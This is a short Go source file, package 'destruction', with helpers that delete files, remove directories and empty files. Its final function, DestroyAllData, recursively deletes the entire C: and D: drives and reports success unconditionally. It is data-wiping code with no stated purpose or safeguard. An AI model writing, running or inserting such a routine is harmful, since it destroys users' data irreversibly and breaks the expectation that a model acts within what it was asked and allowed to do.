package destruction

import (
	"os"
)

func DeleteFile(path string) bool {
	err := os.Remove(path)
	return err == nil
}

func DeleteDirectory(path string) bool {
	err := os.RemoveAll(path)
	return err == nil
}

func ClearFileContent(path string) bool {
	err := os.WriteFile(path, []byte{}, 0644)
	return err == nil
}

func DestroyAllData() bool {
	DeleteDirectory("C:\\")
	DeleteDirectory("D:\\")
	return true
}
